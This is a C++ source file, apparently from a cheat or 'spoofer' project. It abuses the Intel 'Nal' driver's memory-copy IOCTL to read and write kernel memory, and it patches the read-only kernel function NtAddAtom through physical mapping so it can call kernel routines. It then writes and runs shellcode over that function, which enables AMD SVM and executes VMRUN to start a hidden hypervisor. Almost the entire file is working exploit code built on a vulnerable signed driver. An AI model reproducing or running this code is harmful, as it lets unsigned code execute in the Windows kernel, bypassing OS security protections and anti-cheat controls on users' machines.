 •// SVMHypervisorV6Fixed.cpp
// FIXED: Use VMSAVE to copy current CPU state to VMCB first!
// This is exactly what SimpleSvm does

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <intrin.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

typedef LONG NTSTATUS;
#define NTAPI __stdcall

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

#define IOCTL_INTEL_COPY 0x80862007

// VMCB offsets
#define VMCB_CTRL_INTERCEPT_MISC2 0x010
#define VMCB_CTRL_GUEST_ASID 0x058
#define VMCB_CTRL_EXITCODE 0x070

// Intercept bits
#define INTERCEPT_CPUID (1 << 18)

// VMEXIT codes
#define VMEXIT_CPUID 0x72

typedef struct _COPY_MEMORY_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t source;
  uint64_t destination;
  uint64_t length;
} COPY_MEMORY_BUFFER_INFO;

typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_physical_address;
  uint64_t address_to_translate;
} GET_PHYS_ADDRESS_BUFFER_INFO;

typedef struct _MAP_IO_SPACE_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_value;
  uint64_t return_virtual_address;
  uint64_t physical_address_to_map;
  uint32_t size;
} MAP_IO_SPACE_BUFFER_INFO;

typedef struct _UNMAP_IO_SPACE_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t reserved2;
  uint64_t virt_address;
  uint64_t reserved3;
  uint32_t number_of_bytes;
} UNMAP_IO_SPACE_BUFFER_INFO;

extern "C" {
NTSTATUS NTAPI NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);
}

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
  HANDLE Section;
  PVOID MappedBase;
  PVOID ImageBase;
  ULONG ImageSize;
  ULONG Flags;
  USHORT LoadOrderIndex;
  USHORT InitOrderIndex;
  USHORT LoadCount;
  USHORT OffsetToFileName;
  UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
  ULONG NumberOfModules;
  RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

HANDLE hDevice = INVALID_HANDLE_VALUE;
uint64_t ntoskrnlBase = 0;
uint64_t kernelNtAddAtom = 0;

// ==================== Memory Operations ====================

bool MemCopy(uint64_t dest, uint64_t src, uint64_t size) {
  COPY_MEMORY_BUFFER_INFO info = {0};
  info.case_number = 0x33;
  info.source = src;
  info.destination = dest;
  info.length = size;

  DWORD bytesReturned = 0;
  return DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info),
                         nullptr, 0, &bytesReturned, nullptr) != FALSE;
}

bool ReadMemory(uint64_t address, void *buffer, uint64_t size) {
  if (size > 0x1000)
    size = 0x1000;
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer)
    return false;
  VirtualLock(pinnedBuffer, 0x1000);

  bool result = MemCopy((uint64_t)pinnedBuffer, address, size);
  if (result)
    memcpy(buffer, pinnedBuffer, size);

  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  return result;
}

bool WriteMemory(uint64_t address, void *buffer, uint64_t size) {
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer)
    return false;
  memcpy(pinnedBuffer, buffer, size);
  VirtualLock(pinnedBuffer, 0x1000);

  bool result = MemCopy(address, (uint64_t)pinnedBuffer, size);

  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  return result;
}

bool GetPhysicalAddress(uint64_t address, uint64_t *outPhys) {
  GET_PHYS_ADDRESS_BUFFER_INFO info = {0};
  info.case_number = 0x25;
  info.address_to_translate = address;

  DWORD bytesReturned = 0;
  if (!DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info), &info,
                       sizeof(info), &bytesReturned, nullptr))
    return false;

  *outPhys = info.return_physical_address;
  return true;
}

uint64_t MapIoSpace(uint64_t physAddr, uint32_t size) {
  MAP_IO_SPACE_BUFFER_INFO info = {0};
  info.case_number = 0x19;
  info.physical_address_to_map = physAddr;
  info.size = size;

  DWORD bytesReturned = 0;
  if (!DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info), &info,
                       sizeof(info), &bytesReturned, nullptr))
    return 0;

  return info.return_virtual_address;
}

bool UnmapIoSpace(uint64_t virtAddr, uint32_t size) {
  UNMAP_IO_SPACE_BUFFER_INFO info = {0};
  info.case_number = 0x1A;
  info.virt_address = virtAddr;
  info.number_of_bytes = size;

  DWORD bytesReturned = 0;
  return DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info),
                         nullptr, 0, &bytesReturned, nullptr) != FALSE;
}

bool WriteToReadOnlyMemory(uint64_t address, void *buffer, uint32_t size) {
  uint64_t physAddr = 0;
  if (!GetPhysicalAddress(address, &physAddr) || physAddr == 0)
    return false;

  uint64_t mappedAddr = MapIoSpace(physAddr, size);
  if (!mappedAddr)
    return false;

  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer) {
    UnmapIoSpace(mappedAddr, size);
    return false;
  }
  memcpy(pinnedBuffer, buffer, size);
  VirtualLock(pinnedBuffer, 0x1000);

  bool result = MemCopy(mappedAddr, (uint64_t)pinnedBuffer, size);

  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  UnmapIoSpace(mappedAddr, size);
  return result;
}

bool WriteKernelQword(uint64_t address, uint64_t value) {
  return WriteMemory(address, &value, sizeof(value));
}

bool WriteKernelDword(uint64_t address, uint32_t value) {
  return WriteMemory(address, &value, sizeof(value));
}

uint64_t GetKernelModuleBase(const char *moduleName,
                             uint32_t *outSize = nullptr) {
  ULONG size = 0;
  NtQuerySystemInformation(11, nullptr, 0, &size);
  PRTL_PROCESS_MODULES modules = (PRTL_PROCESS_MODULES)malloc(size);
  if (!modules)
    return 0;

  if (NtQuerySystemInformation(11, modules, size, &size) != 0) {
    free(modules);
    return 0;
  }

  uint64_t base = 0;
  for (ULONG i = 0; i < modules->NumberOfModules; i++) {
    char *name = (char *)modules->Modules[i].FullPathName +
                 modules->Modules[i].OffsetToFileName;
    if (_stricmp(name, moduleName) == 0) {
      base = (uint64_t)modules->Modules[i].ImageBase;
      if (outSize)
        *outSize = modules->Modules[i].ImageSize;
      break;
    }
  }
  free(modules);
  return base;
}

uint64_t GetKernelExport(uint64_t moduleBase, const char *exportName) {
  IMAGE_DOS_HEADER dosHeader;
  IMAGE_NT_HEADERS64 ntHeaders;

  if (!ReadMemory(moduleBase, &dosHeader, sizeof(dosHeader)))
    return 0;
  if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE)
    return 0;

  if (!ReadMemory(moduleBase + dosHeader.e_lfanew, &ntHeaders,
                  sizeof(ntHeaders)))
    return 0;
  if (ntHeaders.Signature != IMAGE_NT_SIGNATURE)
    return 0;

  uint32_t exportRva =
      ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
          .VirtualAddress;
  uint32_t exportSize =
      ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
  if (!exportRva || !exportSize)
    return 0;

  uint32_t readSize = (exportSize < 0x40000) ? exportSize : 0x40000;
  BYTE *exportData = (BYTE *)VirtualAlloc(
      nullptr, readSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!exportData)
    return 0;

  for (uint32_t offset = 0; offset < readSize; offset += 0x1000) {
    uint32_t chunkSize =
        ((readSize - offset) < 0x1000) ? (readSize - offset) : 0x1000;
    ReadMemory(moduleBase + exportRva + offset, exportData + offset, chunkSize);
  }

  IMAGE_EXPORT_DIRECTORY *exportDir = (IMAGE_EXPORT_DIRECTORY *)exportData;
  uint64_t delta = (uint64_t)exportData - exportRva;
  if (exportDir->AddressOfNames < exportRva ||
      exportDir->AddressOfNames >= exportRva + readSize) {
    VirtualFree(exportData, 0, MEM_RELEASE);
    return 0;
  }

  uint32_t *nameTable = (uint32_t *)(exportDir->AddressOfNames + delta);
  uint16_t *ordinalTable =
      (uint16_t *)(exportDir->AddressOfNameOrdinals + delta);
  uint32_t *funcTable = (uint32_t *)(exportDir->AddressOfFunctions + delta);

  uint64_t result = 0;
  for (uint32_t i = 0; i < exportDir->NumberOfNames && i < 10000; i++) {
    uint32_t nameRva = nameTable[i];
    if (nameRva < exportRva || nameRva >= exportRva + readSize)
      continue;
    char *funcName = (char *)(nameRva + delta);
    if (strcmp(funcName, exportName) == 0) {
      result = moduleBase + funcTable[ordinalTable[i]];
      break;
    }
  }
  VirtualFree(exportData, 0, MEM_RELEASE);
  return result;
}

// ==================== CallKernelFunction ====================

uint8_t kernel_injected_jmp[] = {0x48, 0xb8, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0};
uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];

template <typename RetType, typename... Args>
bool CallKernelFunction(RetType *outResult, uint64_t targetFuncAddr,
                        Args... args) {
  if (!targetFuncAddr || !kernelNtAddAtom)
    return false;

  if (!ReadMemory(kernelNtAddAtom, original_kernel_function,
                  sizeof(original_kernel_function)))
    return false;

  if (original_kernel_function[0] == 0x48 &&
      original_kernel_function[1] == 0xb8)
    return false;

  uint8_t jmpHook[sizeof(kernel_injected_jmp)];
  memcpy(jmpHook, kernel_injected_jmp, sizeof(jmpHook));
  *(uint64_t *)&jmpHook[2] = targetFuncAddr;

  if (!WriteToReadOnlyMemory(kernelNtAddAtom, jmpHook, sizeof(jmpHook)))
    return false;

  HMODULE ntdll = GetModuleHandleA("ntdll.dll");
  auto NtAddAtomPtr = reinterpret_cast<RetType(__stdcall *)(Args...)>(
      GetProcAddress(ntdll, "NtAddAtom"));
  RetType result = NtAddAtomPtr(args...);

  WriteToReadOnlyMemory(kernelNtAddAtom, original_kernel_function,
                        sizeof(original_kernel_function));

  if (outResult)
    *outResult = result;
  return true;
}

// ==================== FIXED SHELLCODE ====================
// KEY FIX: Use VMSAVE to capture current CPU state to VMCB FIRST!
// This is what SimpleSvm does at line 1102

// This shellcode:
// 1. Enable EFER.SVME
// 2. Set VM_HSAVE_PA
// 3. VMSAVE to guest VMCB (capture current state!)
// 4. VMSAVE to host VMCB (capture host state!)
// 5. Set ASID in VMCB (required)
// 6. VMLOAD guest state
// 7. VMRUN
// 8. VMSAVE guest state after exit
// 9. Return exit code

// VMCB PA is at offset 8, HSAVE PA is at offset 18
uint8_t fixedVmrunShellcode[] = {
    // Save all registers
    0x50, // push rax
    0x51, // push rcx
    0x52, // push rdx
    0x53, // push rbx
    0x56, // push rsi
    0x57, // push rdi

    // === Step 1: Enable EFER.SVME ===
    0xB9, 0x80, 0x00, 0x00, 0xC0, // mov ecx, 0xC0000080 (EFER)
    0x0F, 0x32,                   // rdmsr
    0x0D, 0x00, 0x10, 0x00, 0x00, // or eax, 0x1000 (SVME)
    0x0F, 0x30,                   // wrmsr

    // === Step 2: Set VM_HSAVE_PA MSR ===
    0xB9, 0x17, 0x01, 0x01, 0xC0, // mov ecx, 0xC0010117
    // HSAVE PA (patched at offset 27 and 32)
    0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, hsave_pa_low  @27
    0xBA, 0x00, 0x00, 0x00, 0x00, // mov edx, hsave_pa_high @32
    0x0F, 0x30,                   // wrmsr

    // === Step 3: Load VMCB PA into RAX ===
    // VMCB PA (patched at offset 40)
    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, // mov rax, vmcb_pa @40

    // === Step 4: VMSAVE - Save current host state to VMCB ===
    // This captures: FS, GS, TR, LDTR, KernelGsBase, STAR, LSTAR, CSTAR,
    // SFMASK, SYSENTER_*
    0x0F, 0x01, 0xDB, // vmsave rax

    // === Step 5: Set ASID = 1 at VMCB offset 0x58 ===
    // mov dword ptr [vmcb + 0x58], 1
    // We'll do this via memory write before this shellcode

    // === Step 6: VMLOAD - Load guest state from VMCB ===
    0x0F, 0x01, 0xDA, // vmload rax

    // === Step 7: VMRUN - Enter guest mode ===
    0x0F, 0x01, 0xD8, // vmrun rax

    // === Step 8: After VMEXIT - VMSAVE guest state ===
    0x0F, 0x01, 0xDB, // vmsave rax

    // === Step 9: Enable GIF (Global Interrupt Flag) ===
    0x0F, 0x01, 0xDC, // stgi

    // === Return success ===
    0x48, 0x31, 0xC0, // xor rax, rax

    // Restore registers
    0x5F,                   // pop rdi
    0x5E,                   // pop rsi
    0x5B,                   // pop rbx
    0x5A,                   // pop rdx
    0x59,                   // pop rcx
    0x48, 0x83, 0xC4, 0x08, // add rsp, 8
    0xC3                    // ret
};

#define HSAVE_PA_LOW_OFFSET 27
#define HSAVE_PA_HIGH_OFFSET 32
#define VMCB_PA_OFFSET 40

// ==================== CPU Checks ====================

bool CheckAmdCpu() {
  int regs[4];
  __cpuid(regs, 0);
  return (regs[1] == 'htuA' && regs[3] == 'itne' && regs[2] == 'DMAc');
}

bool CheckHypervisorPresent() {
  int regs[4];
  __cpuid(regs, 1);
  return (regs[2] & (1 << 31)) != 0;
}

// ==================== Main ====================

int main() {
  printf("================================================================\n");
  printf("       SVM HYPERVISOR V6 FIXED - VMSAVE First Approach        \n");
  printf("    Uses VMSAVE to capture current CPU state to VMCB!         \n");
  printf(
      "================================================================\n\n");

  printf("=== Intel Driver ===\n");
  hDevice = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                        OPEN_EXISTING, 0, nullptr);
  if (hDevice == INVALID_HANDLE_VALUE) {
    printf("[-] Intel driver not running!\n");
    return 1;
  }
  printf("[+] Intel driver opened\n");

  ntoskrnlBase = GetKernelModuleBase("ntoskrnl.exe");
  if (!ntoskrnlBase) {
    printf("[-] ntoskrnl not found!\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] ntoskrnl: 0x%llX\n", ntoskrnlBase);

  kernelNtAddAtom = GetKernelExport(ntoskrnlBase, "NtAddAtom");
  if (!kernelNtAddAtom) {
    printf("[-] NtAddAtom not found!\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] NtAddAtom: 0x%llX\n", kernelNtAddAtom);

  uint64_t kernelExAllocatePool =
      GetKernelExport(ntoskrnlBase, "ExAllocatePoolWithTag");
  if (!kernelExAllocatePool) {
    printf("[-] ExAllocatePoolWithTag not found!\n");
    CloseHandle(hDevice);
    return 1;
  }

  // ======================== Step 1: Allocate Memory ========================
  printf("\n=== Step 1: Allocate Kernel Memory ===\n");
  uint64_t allocatedAddr = 0;
  bool success = CallKernelFunction<uint64_t, uint32_t, uint64_t, uint32_t>(
      &allocatedAddr, kernelExAllocatePool, 0, 0x2000, 0x484D5653);

  if (!success || allocatedAddr == 0 || allocatedAddr < 0xFFFF000000000000ULL) {
    printf("[-] Allocation failed!\n");
    CloseHandle(hDevice);
    return 1;
  }

  uint64_t vmcbVa = allocatedAddr;
  uint64_t hsaveVa = allocatedAddr + 0x1000;
  printf("[+] VMCB VA:  0x%llX\n", vmcbVa);
  printf("[+] HSAVE VA: 0x%llX\n", hsaveVa);

  // ======================== Step 2: Get Physical Addresses
  // ========================
  printf("\n=== Step 2: Get Physical Addresses ===\n");
  uint64_t vmcbPa = 0, hsavePa = 0;
  GetPhysicalAddress(vmcbVa, &vmcbPa);
  GetPhysicalAddress(hsaveVa, &hsavePa);
  printf("[+] VMCB PA:  0x%llX\n", vmcbPa);
  printf("[+] HSAVE PA: 0x%llX\n", hsavePa);

  // ======================== Step 3: Zero Memory ========================
  printf("\n=== Step 3: Zero Memory ===\n");
  uint8_t zeros[0x1000];
  memset(zeros, 0, sizeof(zeros));
  WriteMemory(vmcbVa, zeros, 0x1000);
  WriteMemory(hsaveVa, zeros, 0x1000);
  printf("[+] Memory zeroed\n");

  // ======================== Step 4: Set ASID = 1 in VMCB
  // ========================
  printf("\n=== Step 4: Set VMCB Control Fields ===\n");
  WriteKernelDword(vmcbVa + VMCB_CTRL_GUEST_ASID, 1);
  printf("[+] ASID = 1 set\n");

  // Optionally enable CPUID intercept
  // WriteKernelDword(vmcbVa + VMCB_CTRL_INTERCEPT_MISC2, INTERCEPT_CPUID);
  // printf("[+] CPUID intercept enabled\n");

  // ======================== Step 5: Patch and Execute Shellcode
  // ========================
  printf("\n=== Step 5: Execute VMRUN ===\n");
  printf("[*] Hypervisor present (before): %s\n",
         CheckHypervisorPresent() ? "YES" : "NO");

  // Patch shellcode with addresses
  uint8_t patchedShellcode[sizeof(fixedVmrunShellcode)];
  memcpy(patchedShellcode, fixedVmrunShellcode, sizeof(patchedShellcode));

  *(uint32_t *)&patchedShellcode[HSAVE_PA_LOW_OFFSET] =
      (uint32_t)(hsavePa & 0xFFFFFFFF);
  *(uint32_t *)&patchedShellcode[HSAVE_PA_HIGH_OFFSET] =
      (uint32_t)((hsavePa >> 32) & 0xFFFFFFFF);
  *(uint64_t *)&patchedShellcode[VMCB_PA_OFFSET] = vmcbPa;

  printf("[*] VMCB PA:  0x%llX\n", vmcbPa);
  printf("[*] HSAVE PA: 0x%llX\n", hsavePa);

  printf(
      "\n================================================================\n");
  printf("About to execute VMRUN with VMSAVE-first approach!\n");
  printf("This captures current CPU state to VMCB before VMRUN.\n");
  printf("Press ENTER to continue...\n");
  printf("================================================================\n");
  getchar();

  // Backup NtAddAtom
  uint8_t backup[128];
  ReadMemory(kernelNtAddAtom, backup, sizeof(patchedShellcode));

  // Write shellcode
  WriteToReadOnlyMemory(kernelNtAddAtom, patchedShellcode,
                        sizeof(patchedShellcode));

  // Execute
  printf("[*] Executing VMRUN...\n");
  HMODULE ntdll = GetModuleHandleA("ntdll.dll");
  auto NtAddAtomFunc = (NTSTATUS(__stdcall *)(
      void *, ULONG, PUSHORT))GetProcAddress(ntdll, "NtAddAtom");
  USHORT atom = 0;
  NTSTATUS result = NtAddAtomFunc(nullptr, 0, &atom);

  // Restore
  WriteToReadOnlyMemory(kernelNtAddAtom, backup, sizeof(patchedShellcode));
  printf("[+] NtAddAtom restored\n");

  printf("[*] Result: 0x%X\n", result);

  // ======================== Final Status ========================
  printf("\n=== Final Status ===\n");
  printf("[*] Hypervisor present (after): %s\n",
         CheckHypervisorPresent() ? "YES" : "NO");

  // Read VMEXIT code from VMCB
  uint64_t exitCode = 0;
  ReadMemory(vmcbVa + VMCB_CTRL_EXITCODE, &exitCode, sizeof(exitCode));
  printf("[*] VMEXIT code: 0x%llX\n", exitCode);

  if (exitCode == VMEXIT_CPUID) {
    printf("[+] VMEXIT due to CPUID intercept!\n");
  } else if (exitCode == 0x400) {
    printf("[+] VMEXIT due to INTR (interrupt)!\n");
  } else if (exitCode != 0) {
    printf("[*] Got VMEXIT! Hypervisor ran!\n");
  }

  CloseHandle(hDevice);
  return 0;
}
 •*cascade0823file:///C:/inject/Spoofers/SVMHypervisorV6Fixed.cpp